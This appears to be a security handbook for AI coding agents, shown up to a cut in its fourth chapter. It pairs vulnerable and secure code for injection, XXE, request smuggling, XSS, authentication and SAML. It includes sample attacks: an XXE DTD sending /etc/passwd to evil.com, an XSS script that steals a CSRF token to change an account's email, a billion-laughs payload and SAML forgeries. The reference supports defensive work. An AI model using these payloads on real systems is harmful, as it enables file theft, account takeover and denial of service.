
────────────────────────────────────────────────────────────
Web Application Security for AI Agents
ID: cmmj33tuj00pumw01eqmthzdh | 39 pages
────────────────────────────────────────────────────────────

── Page 1 ──

# Web Application Security for AI Agents

A comprehensive, agent-optimized reference for building, reviewing, and securing web applications. Written as original content informed by deep study of the field's canonical works, OWASP standards, and current threat research.

---

## How to Use This Book

This book is structured for AI agents that write, review, or audit web application code. Each chapter is **self-contained** — you can load any chapter independently without reading prior chapters.

**Chapter structure:**
- **Threat Summary** — what this chapter covers (2-3 sentences)
- **Severity** — CRITICAL, HIGH, MEDIUM, or LOW
- **Quick Reference** — decision table or checklist
- **Core Rules** — numbered, actionable principles
- **Examples** — vulnerable code vs. secure code, annotated
- **Verification** — how to confirm the fix works
- **Common Mistakes** — anti-patterns to avoid

**When to use this book:**
- Writing new web application code (check relevant chapters before implementation)
- Reviewing code for security issues (use checklists as review guides)
- Debugging security vulnerabilities (find the chapter matching the vulnerability class)
- Designing authentication, authorization, or session management systems

**Severity definitions:**
- **CRITICAL** — Direct path to full system compromise, data breach, or account takeover
- **HIGH** — Significant security impact, exploitable without special conditions
- **MEDIUM** — Security impact requires specific conditions or user interaction
- **LOW** — Minor information disclosure or defense-in-depth concern

---

## Table of Contents

1. Chapter 1: The Foundational Security Axiom (p. 2)
2. Chapter 2: Injection Attacks (p. 3)
3. Chapter 3: Cross-Site Scripting (XSS) (p. 4)
4. Chapter 4: Authentication Security (p. 5)
5. Chapter 5: Session Management (p. 6)
6. Chapter 6: Access Control and Authorization (p. 7)
7. Chapter 7: API Security (p. 8)
8. Chapter 8: Server-Side Request Forgery (SSRF) (p. 9)
9. Chapter 9: Cross-Site Request Forgery (CSRF) (p. 10)
10. Chapter 10: File Upload Security (p. 11)
11. Chapter 11: Cryptography and Transport Security (p. 12)
12. Chapter 12: Security Headers and Browser Defenses (p. 13)
13. Chapter 13: Client-Side Security (p. 14)
14. Chapter 14: Business Logic Vulnerabilities (p. 15)
15. Chapter 15: Supply Chain Security (p. 16)
16. Chapter 16: Cloud-Native Web Security (p. 17)
17. Chapter 17: Deserialization Attacks (p. 18)
18. Chapter 18: Race Conditions (p. 19)
19. Chapter 19: Path Traversal and File Access (p. 20)
20. Chapter 20: Error Handling and Information Disclosure (p. 21)
21. Chapter 21: Security Testing Methodology (p. 22)
22. Chapter 22: Secure Development Checklist (p. 23)
23. Chapter 23: Secure Design Patterns (p. 24)
24. Chapter 24: Server-Side JavaScript Security (p. 25)
25. Chapter 25: Modern Framework Security (p. 26)
26. Chapter 26: ORM and Database Layer Security (p. 27)
27. Chapter 27: Payment and Financial Security (p. 28)
28. Chapter 28: Security Logging, Monitoring, and Audit Trails (p. 29)
29. Chapter 29: Credential Lifecycle Management (p. 30)
30. Chapter 30: Privacy, Data Protection, and Compliance (p. 31)
31. Chapter 31: Server-Generated Code and Dynamic Output Injection (p. 32)
32. Chapter 32: Middleware Architecture and Route Security (p. 33)

---

── Page 2 ──

# Chapter 1: The Foundational Security Axiom

**Threat Summary:** Every web application security vulnerability traces back to one root problem: trusting data that crosses a trust boundary. Understanding this axiom prevents entire vulnerability classes.

**Severity:** CRITICAL — This principle underlies all other chapters.

## Core Rules

**Rule 1: All user input is untrusted.**
Every piece of data that originates from outside the server is under the attacker's control. This includes:
- URL parameters, query strings, and path segments
- POST body fields (form data, JSON, XML)
- HTTP headers (including Host, Referer, User-Agent, Accept-Language)
- Cookies
- File uploads (name, content, MIME type)
- WebSocket messages
- URL fragments (for client-side code)

**Rule 2: Client-side controls provide zero security.**
Any validation, obfuscation, encryption, or access control implemented on the client can be bypassed. The attacker controls the client entirely. Client-side validation is for UX only; security validation must be replicated server-side.

This means:
- Hidden form fields can be modified
- JavaScript validation can be disabled
- maxlength attributes can be removed
- Disabled form elements can be re-enabled and submitted
- Client-side encryption keys are visible to the attacker
- SSL does not protect the server from the client — it protects the channel from third parties

**Rule 3: Apply boundary validation at every trust boundary, not just the perimeter.**
A single input filter at the application's edge is insufficient because:
- Data transforms through processing chains (decoding, encoding, concatenation)
- Different components are vulnerable to different attack types
- A value safe for HTML rendering may be unsafe for SQL

Each component should validate its own inputs independently.

**Rule 4: Canonicalize before you validate.**
If an application validates input then canonicalizes it (URL decoding, Unicode normalization, case conversion), the attacker bypasses validation by encoding the payload. Always resolve the input to its canonical form first, then validate.

**Rule 5: Fail closed.**
When an error occurs during a security check (authentication, authorization, input validation), the default outcome must be denial. Never grant access on exception.

**Rule 6: Defense in depth.**
No single control should be the only barrier. Layer defenses so that if one fails, others still protect the system. For example: parameterized queries AND input validation AND least-privilege database accounts.

## Quick Reference: Trust Boundary Checklist

| Data Source | Trusted? | Action Required |
|-------------|----------|-----------------|
| URL parameters | No | Validate type, length, format, range |
| POST body | No | Validate type, length, format, range |
| HTTP headers | No | Validate expected values only |
| Cookies | No | Validate server-side; never store decisions in cookies |
| File uploads | No | Validate extension, content type, magic bytes, size |
| Database results | Partially | Output-encode for the rendering context |
| Internal API responses | Partially | Validate schema and expected types |
| Environment variables | Yes (if set at deploy time) | Do not expose to clients |

---

── Page 3 ──

# Chapter 2: Injection Attacks

**Threat Summary:** Injection occurs when attacker-controlled data crosses from the data plane into the control plane of an interpreter — SQL engine, OS shell, LDAP parser, template engine, or code evaluator. It is the most direct path to system compromise.

**Severity:** CRITICAL

## Quick Reference: Injection Types

| Type | Interpreter | Impact | Primary Defense |
|------|------------|--------|-----------------|
| SQL Injection | Database engine | Full DB access, data theft, RCE | Parameterized queries |
| OS Command Injection | System shell | Full server compromise | Avoid shell calls; use safe APIs |
| Server-Side Template Injection | Template engine (Jinja2, Twig, etc.) | RCE | Never render user input as templates |
| Code Injection | Language runtime (eval, include) | RCE | Never eval user input |
| LDAP Injection | LDAP directory | Auth bypass, data access | Escape LDAP metacharacters |
| XPath Injection | XML query engine | Data access, auth bypass | Parameterized XPath or escape |
| SMTP Injection | Mail server | Spam, phishing | Validate email fields strictly |
| NoSQL Injection | MongoDB, etc. | Data access, auth bypass | Use typed query builders |

## Core Rules

**Rule 1: Use parameterized queries for all database access. No exceptions.**
Never concatenate user input into SQL strings. This single rule eliminates SQL injection entirely.

```
// VULNERABLE — string concatenation
const query = `SELECT * FROM users WHERE id = ${userId}`;

// SECURE — parameterized query
const query = `SELECT * FROM users WHERE id = $1`;
const result = await db.query(query, [userId]);
```

```python
// VULNERABLE
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")

// SECURE
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

**Rule 2: Never pass user input to OS command execution functions.**
If you must invoke a system command, use APIs that accept argument arrays (not shell strings) and never include user input in the command string.

```python
// VULNERABLE — shell injection
os.system(f"convert {filename} output.png")

// SECURE — argument array, no shell
subprocess.run(["convert", filename, "output.png"], shell=False)
```

```javascript
// VULNERABLE
exec(`grep ${userInput} /var/log/app.log`);

// SECURE
execFile("grep", [userInput, "/var/log/app.log"]);
```

**Rule 3: Never use eval(), Function(), or dynamic code execution with user input.**
This applies to all languages:
- JavaScript: `eval()`, `new Function()`, `setTimeout(string)`, `setInterval(string)`
- Python: `eval()`, `exec()`, `compile()`
- PHP: `eval()`, `assert()`, `preg_replace()` with `e` modifier
- Ruby: `eval()`, `send()` with user input

**Rule 4: Never render user input as a template.**
If user input reaches a template engine (Jinja2, Twig, Freemarker, Handlebars), the attacker achieves code execution.

```python
// VULNERABLE — user input rendered as template
template = Template(user_input)
result = template.render()

// SECURE — user input is data, not template
template = Template("Hello, {{ name }}")
result = template.render(name=user_input)
```

Detection: If `{{7*7}}` renders as `49` in the output, the template engine is processing user input.

**Rule 5: For NoSQL databases, use typed query builders and reject operator injection.**

```javascript
// VULNERABLE — MongoDB operator injection
// Attacker sends: {"username": {"$gt": ""}, "password": {"$gt": ""}}
db.users.find({ username: req.body.username, password: req.body.password });

// SECURE — enforce string type
const username = String(req.body.username);
const password = String(req.body.password);
db.users.find({ username, password });
```

**Rule 6: Beware second-order injection.**
Data stored safely in a database may be used unsafely in a later query. Validate at every point of use, not just at input.

## SQL Injection Detection Patterns (for code review)

| Language/Framework | Vulnerable Pattern | Fix |
|-------------------|-------------------|-----|
| Raw SQL (any) | String concatenation or interpolation in query | Use parameterized query |
| Node.js (mysql) | `connection.query("... " + variable)` | `connection.query("... ?", [variable])` |
| Python (psycopg2) | `cursor.execute(f"... {var}")` | `cursor.execute("... %s", (var,))` |
| Java (JDBC) | `Statement.execute("... " + var)` | Use `PreparedStatement` with `?` |
| PHP (PDO) | `$pdo->query("... $var")` | `$pdo->prepare("... ?"); $stmt->execute([$var])` |
| ORM (any) | `.raw()`, `.extra()`, `.whereRaw()` with user input | Use ORM query builder methods |
| Prisma | `$queryRaw` with template literal | `$queryRaw` with `Prisma.sql` tagged template |

## Verification

- Submit `'` (single quote) in every input field and check for database errors
- Submit `{{7*7}}` and check if `49` appears (SSTI)
- Submit `; sleep 5` in parameters and measure response time (command injection)
- Run SAST tools configured to flag string concatenation in queries
- Review all uses of `.raw()`, `.exec()`, `eval()`, `system()` in the codebase

## XXE (XML External Entity) Injection

**Severity:** CRITICAL

XXE exploits XML parsers that process external entity declarations. If the application parses user-supplied XML (SOAP APIs, file uploads, SAML, SVG, DOCX), it may be vulnerable.

**Attack types:**

| Attack | Mechanism | Impact |
|--------|-----------|--------|
| File reading | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Read arbitrary files |
| SSRF via XXE | `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">` | Access cloud metadata |
| Billion laughs (DoS) | Exponentially expanding entity references | Memory exhaustion, crash |
| Blind XXE (OOB) | Exfiltrate data via external DTD to attacker server | Data theft without direct output |

**Vulnerable vs. secure code:**

```java
// VULNERABLE — Java default XML parser allows external entities
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(userInputStream); // Processes external entities!

// SECURE — disable external entities and DTDs
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(userInputStream);
```

```python
// VULNERABLE — Python lxml with default settings
from lxml import etree
doc = etree.parse(user_file)  # Processes external entities

// SECURE — disable entity resolution
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)
doc = etree.parse(user_file, parser)

// ALSO SECURE — use defusedxml (recommended)
import defusedxml.ElementTree as ET
doc = ET.parse(user_file)  # Blocks all entity expansion by default
```

```javascript
// VULNERABLE — Node.js with libxmljs
const xml = libxmljs.parseXml(userInput); // Processes entities by default

// SECURE — disable entities
const xml = libxmljs.parseXml(userInput, { noent: false, dtdload: false, nocdata: true });
```

**Billion laughs attack (entity expansion DoS):**

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- Expands to ~3 GB from a few bytes -->
]>
<data>&lol4;</data>
```

**Blind XXE via out-of-band (OOB) exfiltration:**

The attacker cannot see the file content directly in the response, so they use a parameter entity to send data to their server:

```xml
<!-- Attacker's external DTD hosted at https://evil.com/xxe.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://evil.com/steal?data=%file;'>">
%eval;
%exfiltrate;
```

**Core Rules for XXE prevention:**

1. Disable external entity processing in ALL XML parsers — this is the single most important defense
2. Use `defusedxml` (Python), disable DTDs (Java), or equivalent for your language
3. Prefer JSON over XML when possible — JSON parsers do not have entity expansion
4. Validate and sanitize SVG uploads — SVGs are XML and can contain XXE payloads
5. DOCX, XLSX, PPTX files are ZIP archives containing XML — parse them with XXE-safe parsers

## HTTP Parameter Pollution (HPP)

**Severity:** MEDIUM

HPP exploits how different web servers and frameworks handle duplicate HTTP parameters. Attackers submit the same parameter multiple times to bypass WAFs, validation, or inject unexpected values.

**Server behavior with duplicate parameters (`?id=1&id=2`):**

| Server/Framework | Behavior | Result |
|-------------------|----------|--------|
| Express (Node.js) | Returns array | `["1", "2"]` |
| PHP | Last value wins | `"2"` |
| ASP.NET | Comma-joined | `"1,2"` |
| Python Flask | First value wins | `"1"` |
| Java Servlet | First value wins | `"1"` |

**Attack scenarios:**

```
// WAF bypass: WAF checks the first parameter, app uses the last
// WAF sees: id=safe_value (passes check)
// PHP app uses: id=malicious_value
GET /search?id=safe_value&id=malicious_value

// Server-side HPP: injecting extra parameters in backend requests
// Application builds: https://api.payment.com/charge?amount=100&user=attacker
// Attacker submits user=attacker&amount=0.01
// If app concatenates: https://api.payment.com/charge?amount=100&user=attacker&amount=0.01
// Payment API may use the last "amount" value
```

**Prevention:**

```javascript
// SECURE — explicitly take only the first (or last) value
function getParam(req, name) {
  const value = req.query[name];
  // If Express returns an array for duplicate params, take only the first
  return Array.isArray(value) ? value[0] : value;
}

// SECURE — reject requests with duplicate parameters
function rejectDuplicateParams(req, res, next) {
  const rawQuery = req.url.split("?")[1] || "";
  const params = rawQuery.split("&").map((p) => p.split("=")[0]);
  const unique = new Set(params);
  if (params.length !== unique.size) {
    return res.status(400).json({ error: "Duplicate parameters not allowed" });
  }
  next();
}
```

## HTTP Request Smuggling

**Severity:** CRITICAL

Request smuggling exploits disagreements between front-end proxies and back-end servers on where one HTTP request ends and the next begins. This happens when `Content-Length` and `Transfer-Encoding` headers conflict.

**Attack types:**

| Variant | Front-end uses | Back-end uses | Result |
|---------|---------------|---------------|--------|
| CL.TE | Content-Length | Transfer-Encoding | Attacker's smuggled request is interpreted by back-end |
| TE.CL | Transfer-Encoding | Content-Length | Same, reversed |
| TE.TE | Transfer-Encoding | Transfer-Encoding (with obfuscation) | One server fails to parse obfuscated TE header |

**CL.TE smuggling example:**

```
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

The front-end reads 13 bytes (using Content-Length), forwarding the entire body. The back-end uses Transfer-Encoding: chunked, sees `0\r\n\r\n` (end of chunks), and treats `SMUGGLED` as the start of the next request.

**Impact:** Cache poisoning, credential hijacking, request routing manipulation, WAF bypass.

**Prevention:**

```nginx
// SECURE — normalize and reject ambiguous requests (nginx)
// Reject requests with both Content-Length and Transfer-Encoding
proxy_http_version 1.1;  # Use HTTP/1.1 to backend

// Use HTTP/2 end-to-end where possible (immune to CL/TE conflicts)
```

```javascript
// SECURE — Node.js: reject ambiguous requests
app.use((req, res, next) => {
  const hasContentLength = req.headers["content-length"] !== undefined;
  const hasTransferEncoding = req.headers["transfer-encoding"] !== undefined;
  if (hasContentLength && hasTransferEncoding) {
    return res.status(400).json({ error: "Ambiguous request headers" });
  }
  next();
});
```

**Core Rules:**
1. Use HTTP/2 end-to-end — it uses binary framing and is immune to smuggling
2. Ensure front-end and back-end agree on request boundaries
3. Reject requests with both `Content-Length` and `Transfer-Encoding` headers
4. Normalize `Transfer-Encoding` headers — reject obfuscated variants like `Transfer-Encoding: xchunked`
5. Configure your reverse proxy to always normalize requests before forwarding

## Common Mistakes

- Relying on input blacklists instead of parameterized queries
- Using parameterized queries for the main query but concatenating in ORDER BY clauses
- Escaping quotes manually instead of using the database driver's parameterization
- Using an ORM but dropping to raw SQL for complex queries without parameterization
- Validating input on the client side only
- Parsing user-supplied XML without disabling external entities
- Assuming JSON APIs are immune to injection (NoSQL injection still applies)

---

── Page 4 ──

# Chapter 3: Cross-Site Scripting (XSS)

**Threat Summary:** XSS allows an attacker to execute JavaScript in another user's browser, enabling session hijacking, credential theft, page manipulation, and keylogging. It is the most prevalent web vulnerability class.

**Severity:** CRITICAL (stored XSS), HIGH (reflected XSS), MEDIUM (DOM-based XSS)

## Quick Reference: XSS Types

| Type | Data Flow | Storage | Severity |
|------|-----------|---------|----------|
| Stored XSS | Input → database → page | Persistent | CRITICAL — affects all visitors |
| Reflected XSS | Input → server → response | Per-request | HIGH — requires victim to click link |
| DOM-based XSS | Input → client JS → DOM | Client-only | MEDIUM — server never sees payload |

## Core Rules

**Rule 1: Output-encode for the rendering context.**
The correct encoding depends on WHERE the data appears in the HTML:

| Context | Encoding Required | Example |
|---------|-------------------|---------|
| HTML body | HTML entity encoding | `<` → `&lt;`, `>` → `&gt;`, `&` → `&amp;` |
| HTML attribute | HTML attribute encoding + quote the attribute | `"` → `&quot;`, always use quotes |
| JavaScript string | JavaScript encoding | `'` → `\'`, `\` → `\\`, use JSON.stringify() |
| URL parameter | URL encoding | `<` → `%3C` |
| CSS value | CSS encoding | Avoid placing user data in CSS entirely |

**Rule 2: In React/JSX, trust the default escaping but never use dangerouslySetInnerHTML with unsanitized input.**

```jsx
// SAFE — React auto-escapes
<p>{userInput}</p>

// VULNERABLE — bypasses React's escaping
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// SECURE — sanitize first
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

**Rule 3: Validate URLs to prevent javascript: protocol XSS.**

```jsx
// VULNERABLE — javascript: protocol in href
<a href={userProvidedUrl}>Click</a>
// Attacker provides: javascript:alert(document.cookie)

// SECURE — validate protocol
function safeUrl(url: string): string {
  try {
    const parsed = new URL(url);
    if (!["http:", "https:", "mailto:"].includes(parsed.protocol)) {
      return "#";
    }
    return url;
  } catch {
    return "#";
  }
}
<a href={safeUrl(userProvidedUrl)}>Click</a>
```

**Rule 4: For DOM-based XSS, never pass URL-derived data to dangerous sinks.**

Dangerous sources: `document.URL`, `document.location`, `document.referrer`, `window.name`, `location.hash`, `location.search`

Dangerous sinks: `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function(string)`

```javascript
// VULNERABLE — source to sink
document.getElementById("output").innerHTML = location.hash.slice(1);

// SECURE — use textContent instead
document.getElementById("output").textContent = location.hash.slice(1);
```

**Rule 5: Implement Content Security Policy (CSP) as defense-in-depth.**
CSP does not replace output encoding but limits damage if XSS occurs. See Chapter 12 for CSP configuration.

**Rule 6: Set HttpOnly flag on all session cookies.**
This prevents JavaScript (including XSS payloads) from reading session tokens.

## XSS in Vue.js

```html
<!-- VULNERABLE — v-html renders raw HTML -->
<div v-html="userInput"></div>

<!-- SECURE — default interpolation escapes -->
<div>{{ userInput }}</div>
```

## Stored XSS Verification

1. Submit `<img src=x onerror=alert(1)>` in every input field that stores data
2. Check every page where that data is displayed — to the submitting user AND other users
3. Check admin panels that display user-submitted data (blind XSS)
4. Check email notifications that include user-submitted content
5. Test with SVG file upload containing `<script>` tags

## Advanced XSS Exploitation Chains

**Blind XSS:**
Blind XSS occurs when the payload is injected in one context (e.g., a support form, feedback field, or user-agent header) but executes in a completely different context — typically an admin dashboard or internal tool that renders user-submitted data without sanitization.

- Inject payloads in every user-visible field, even those you never see rendered: support tickets, profile bios, order notes, HTTP headers (User-Agent, Referer)
- Use a callback payload to detect execution: `<script src="https://your-server.com/callback?source=support-form"></script>`
- Admin panels are high-value targets because they often render user data with elevated privileges

**Detection rule:** If any user-submitted data is rendered in an admin or internal tool, treat it as a stored XSS vector regardless of where it was submitted.

**XSS-to-CSRF Chain:**
Any XSS vulnerability completely defeats CSRF protections. Once an attacker executes JavaScript in the victim's browser, they can:

1. Read the CSRF token from the page DOM or meta tags
2. Make authenticated requests with the stolen token via `XMLHttpRequest` or `fetch`
3. Perform any state-changing action the victim is authorized to do

```javascript
// XSS payload that defeats CSRF protection
// Step 1: Steal the CSRF token from the page
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

// Step 2: Make an authenticated state-changing request
fetch("/api/account/change-email", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-CSRF-Token": csrfToken,
  },
  credentials: "include",
  body: JSON.stringify({ email: "attacker@evil.com" }),
});
```

**Implication:** CSRF defenses are a secondary protection layer. Preventing XSS is the primary defense, because XSS renders all CSRF mitigations useless.

**Self-XSS Escalation:**
Self-XSS (where a user can only XSS themselves) becomes exploitable when combined with:
- **CSRF + Self-XSS**: attacker forces the victim to submit the XSS payload to their own account via a CSRF attack, then the stored payload executes in the victim's session
- **Login CSRF + Self-XSS**: attacker logs the victim into the attacker's account (via login CSRF), the attacker's account has a stored XSS payload, and it executes in the victim's browser

**Rule:** Never dismiss self-XSS as unexploitable. If any CSRF vector exists, self-XSS can be escalated.

## Common Mistakes

- Encoding for HTML context when the data appears in a JavaScript string context
- Using `innerHTML` for convenience when `textContent` would work
- Sanitizing on input instead of encoding on output (sanitized data may be used in unexpected contexts later)
- Allowing SVG uploads without sanitization (SVGs can contain `<script>` tags)
- Forgetting to encode data in HTML attributes (especially unquoted attributes)
- Trusting that React/Angular/Vue will protect you in ALL contexts (they don't protect `href`, `style`, or `dangerouslySetInnerHTML`)

---

── Page 5 ──

# Chapter 4: Authentication Security

**Threat Summary:** Authentication establishes user identity. Weaknesses here give attackers direct access to user accounts, making it the highest-value target after injection.

**Severity:** CRITICAL

## Quick Reference: Authentication Checklist

| Control | Required | Notes |
|---------|----------|-------|
| All auth over HTTPS | Yes | No exceptions |
| Credentials never in URLs | Yes | Use POST body or headers |
| Credentials never logged | Yes | Redact from all logs |
| Password hashing (bcrypt/scrypt/argon2) | Yes | Never store plaintext or weak hashes |
| Rate limiting on login | Yes | Per-account and per-IP |
| Account lockout or progressive delays | Yes | After 5-10 failed attempts |
| Generic error messages | Yes | Never reveal if username exists |
| MFA available | Yes | For all sensitive accounts |
| Session token regenerated on login | Yes | Prevents session fixation |

## Core Rules

**Rule 1: Hash passwords with bcrypt, scrypt, or Argon2id. Never use MD5, SHA-1, or SHA-256 for passwords.**

```javascript
// VULNERABLE
const hash = crypto.createHash("sha256").update(password).digest("hex");

// SECURE
import bcrypt from "bcrypt";
const hash = await bcrypt.hash(password, 12); // cost factor 12
const isValid = await bcrypt.compare(password, storedHash);
```

Why not SHA-256? SHA-256 is fast by design — an attacker with a GPU can compute billions of SHA-256 hashes per second. bcrypt/scrypt/Argon2 are intentionally slow, making brute force impractical.

**Rule 2: Return identical responses for all authentication failures.**
The login response (status code, body length, headers, redirect URL, and timing) must be identical whether the username is invalid, the password is wrong, or the account is locked.

```javascript
// VULNERABLE — reveals valid usernames
if (!user) return res.json({ error: "User not found" });
if (!validPassword) return res.json({ error: "Incorrect password" });

// SECURE — generic response
// Perform the password hash comparison even if user doesn't exist
// (prevents timing-based enumeration)
const user = await db.findUser(username);
const dummyHash = "$2b$12$dummy.hash.for.timing.equalization";
const hashToCompare = user?.passwordHash ?? dummyHash;
const isValid = await bcrypt.compare(password, hashToCompare);

if (!user || !isValid) {
  return res.status(401).json({ error: "Invalid credentials" });
}
```

**Rule 3: Implement rate limiting with progressive delays.**

```
Attempt 1-3:  No delay
Attempt 4-5:  2-second delay
Attempt 6-8:  5-second delay
Attempt 9-10: 15-second delay
Attempt 11+:  Lock account for 15 minutes, notify user
```

Rate limit by BOTH username and IP address. Rate limiting only by IP allows distributed attacks. Rate limiting only by username allows targeted lockout DoS.

**Rule 4: Password reset tokens must be cryptographically random, single-use, and time-limited.**

```javascript
// SECURE password reset flow
const token = crypto.randomBytes(32).toString("hex"); // 256 bits of entropy
const expiry = new Date(Date.now() + 30 * 60 * 1000); // 30 minutes

await db.saveResetToken({
  userId: user.id,
  tokenHash: crypto.createHash("sha256").update(token).digest("hex"), // store hash, not token
  expiresAt: expiry,
  used: false,
});

// On reset submission:
const tokenHash = crypto.createHash("sha256").update(submittedToken).digest("hex");
const resetRecord = await db.findResetToken(tokenHash);

if (!resetRecord || resetRecord.used || resetRecord.expiresAt < new Date()) {
  return res.status(400).json({ error: "Invalid or expired token" });
}

// Mark as used BEFORE changing password (prevents race condition)
await db.markTokenUsed(resetRecord.id);
await db.updatePassword(resetRecord.userId, newPasswordHash);
```

**Rule 5: Never rely on security questions for account recovery.**
Mother's maiden name, first pet's name, and childhood street are all publicly discoverable. If security questions are required by business rules, treat them as weak factors only — never as the sole recovery mechanism.

**Rule 6: Implement MFA using TOTP (RFC 6238) or WebAuthn.**
- TOTP: use a 30-second time window, allow one window of clock skew
- WebAuthn/Passkeys: phishing-resistant by design — the key pair is domain-bound
- SMS OTP: vulnerable to SIM swapping — avoid as the sole second factor
- Push notifications: vulnerable to fatigue attacks (spamming the user until they approve)

## JWT Authentication Pitfalls

| Pitfall | Attack | Defense |
|---------|--------|---------|
| `alg: none` | Strip signature entirely | Reject `none` algorithm in configuration |
| Algorithm confusion (RS256→HS256) | Sign with public key as HMAC secret | Enforce expected algorithm; never trust JWT's `alg` header |
| Missing expiration | Token lives forever | Always set and validate `exp` claim |
| Token in localStorage | XSS steals token | Store in HttpOnly, Secure, SameSite=Strict cookie |
| Missing audience validation | Token for Service A accepted by Service B | Always validate `aud` claim |
| kid injection | Path traversal or SQLi via key ID | Validate `kid` against a whitelist |

**Rule 7: Never trust the `alg` header from a JWT. Enforce the expected algorithm at the server configuration level.**

## OAuth 2.1 Key Requirements

- PKCE is mandatory for ALL clients (public and confidential)
- Implicit flow is removed — always use authorization code flow
- Resource Owner Password Credentials (ROPC) grant is removed
- Refresh tokens must be sender-constrained or one-time-use
- Redirect URIs must be exact-match validated (no wildcards)

## SAML Authentication Attacks

**Severity:** CRITICAL

SAML (Security Assertion Markup Language) is widely used for SSO in enterprise applications. Its XML-based format introduces unique attack vectors.

**Attack types:**

| Attack | Mechanism | Impact |
|--------|-----------|--------|
| Signature wrapping | Move the signed element, insert a forged assertion | Authentication bypass, impersonation |
| Comment truncation | XML comment inside NameID truncates comparison | `admin<!-- -->@evil.com` matches `admin` |
| XXE in SAML | SAML assertions are XML — entity injection applies | File read, SSRF |
| Signature exclusion | Remove signature entirely; SP doesn't require it | Full auth bypass |
| Replay attack | Resubmit a valid, previously-used assertion | Session hijacking |

**Signature wrapping attack:**

The Identity Provider (IdP) signs a specific XML element. The attacker moves the signed element to an unprocessed location and inserts a forged assertion where the Service Provider (SP) expects it. The SP validates the signature (which is still valid on the moved element) but processes the forged assertion.

```xml
<!-- ATTACK: Original signed assertion moved to Extensions, forged assertion inserted -->
<saml:Response>
  <saml:Extensions>
    <!-- Original signed assertion (moved here — signature still validates) -->
    <saml:Assertion ID="original">
      <saml:Subject>
        <saml:NameID>legitimate-user@company.com</saml:NameID>
      </saml:Subject>
      <ds:Signature>...valid signature...</ds:Signature>
    </saml:Assertion>
  </saml:Extensions>
  <!-- Forged assertion (SP processes this one) -->
  <saml:Assertion ID="forged">
    <saml:Subject>
      <saml:NameID>admin@company.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</saml:Response>
```

**Comment truncation attack:**

```xml
<!-- Some SAML implementations truncate at XML comments -->
<saml:NameID>admin<!-- this is a comment -->@evil.com</saml:NameID>
<!-- IdP validates: admin@evil.com (attacker's account) -->
<!-- SP extracts: admin (truncated at comment, matches admin user) -->
```

**Prevention rules:**

```javascript
// SECURE — SAML validation checklist
// 1. Always validate the signature covers the ENTIRE assertion being processed
// 2. Use a well-maintained SAML library (passport-saml, onelogin, etc.)
// 3. Require signatures on both the Response and the Assertion
// 4. Validate InResponseTo matches the original AuthnRequest ID
// 5. Check NotBefore and NotOnOrAfter timestamps
// 6. Reject assertions with duplicate IDs (replay prevention)

// passport-saml configuration example (Node.js)
const samlConfig = {
  entryPoint: "https://idp.company.com/sso",
  issuer: "my-service-provider",
  cert: idpPublicCert,               // IdP's signing certificate
  wantAssertionsSigned: true,         // REQUIRE signed assertions
  wantAuthnResponseSigned: true,      // REQUIRE signed responses
  audience: "my-service-provider",    // Validate audience
  maxAssertionAgeMs: 300000,          // 5 minute max assertion age
  validateInResponseTo: "always",     // Prevent unsolicited assertions
};
```

**Core Rules for SAML:**
1. Always require signed assertions AND signed responses
2. Validate that the signature covers the assertion you are processing (not a moved copy)
3. Use a well-maintained, actively-audited SAML library — never parse SAML XML manually
4. Validate `InResponseTo`, `NotBefore`, `NotOnOrAfter`, `Audience`, and `Destination`
5. Parse SAML XML with XXE protections enabled (see Chapter 2: XXE)
6. Store processed assertion IDs and reject duplicates (replay prevention)

## Verification

- Attempt login with a valid username and wrong password, then an invalid username — compare response bodies, headers, status codes, and timing
- Submit 20 rapid login attempts — verify rate limiting activates
- Check that passwords are hashed in the database (not plaintext or weak hash)
- Test password reset with expired and reused tokens
- Try accessing authenticated pages with a pre-login session token (session fixation)
- If using SAML: test with unsigned assertions, manipulated NameID, and replayed assertions

---

## Account Linking Vulnerabilities

When linking multiple identity providers to a single account, email alone is never sufficient proof of identity. An attacker who controls any OAuth provider can set arbitrary email addresses.

**Rule: Only auto-link accounts when the provider cryptographically guarantees email verification (email_verified: true from a trusted provider).**

Vulnerable:
```javascript
// VULNERABLE — auto-link by email without verification
async function handleOAuthCallback(profile) {
  let user = await db.users.findUnique({ where: { email: profile.email } });
  if (user) {
    // Attacker registers matching email on another provider → account takeover
    await db.oauthAccounts.create({
      data: { userId: user.id, provider: profile.provider, providerAccountId: profile.id },
    });
    return user;
  }
}
```

Secure:
```javascript
// SECURE — verify email ownership before linking
const trustedProviders = ['google', 'microsoft'];
